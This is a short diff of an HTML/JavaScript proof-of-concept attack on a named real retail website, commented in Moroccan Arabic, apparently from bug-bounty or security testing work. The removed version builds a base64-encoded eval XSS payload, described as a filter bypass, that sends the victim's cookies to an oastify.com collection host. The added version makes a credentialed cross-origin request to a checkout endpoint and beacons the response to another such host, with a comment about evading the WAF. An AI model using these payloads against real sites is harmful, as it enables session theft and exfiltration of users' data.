@@ -1,25 +1,12 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Redirecting...</title>
-</head>
-<body>
-    <script>
-        // الكود اللي كيهز الكوكيز ويصيفطهم لـ Collaborator
-        let collab = "r4wc1lb4jzkbtcffoqgfem0ey54wsugj.oastify.com/?exfil=";
-        let script = "var i=new Image(); i.src='" + collab + "' + btoa(document.cookie);";
-        
-        // تشفير الكود بـ Base64
-        let payload = btoa(script);
-
-        // محاولة الخروج من الـ String (The Bypass)
-        let targetPayload = "'-eval(atob('" + payload + "'))-'";
-
-        // بناء الرابط باستعمال ال# لضمان تجاوز الـ Filter
-        let target = "https://www.decathlon.com/search?q=test#" + encodeURIComponent(targetPayload);
-
-        // تحويل المتصفح للهدف
-        window.location.href = target;
-    </script>
-</body>
-</html>
+<script>
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://www.decathlon.com/shopify_pay/accelerated_checkout", true);
+    xhr.withCredentials = true; // هادي هي اللي كتجر الكوكيز
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+            // صيفط الداتا نيشان لـ Collaborator بلا تشفير (باش مايعيقش الـ WAF)
+            navigator.sendBeacon("https://wyyhvq59d4egnh9kivak8rujsay1m0ap.oastify.com/?data=" + xhr.responseText.substring(0,100));
+        }
+    };
+    xhr.send();
+</script>
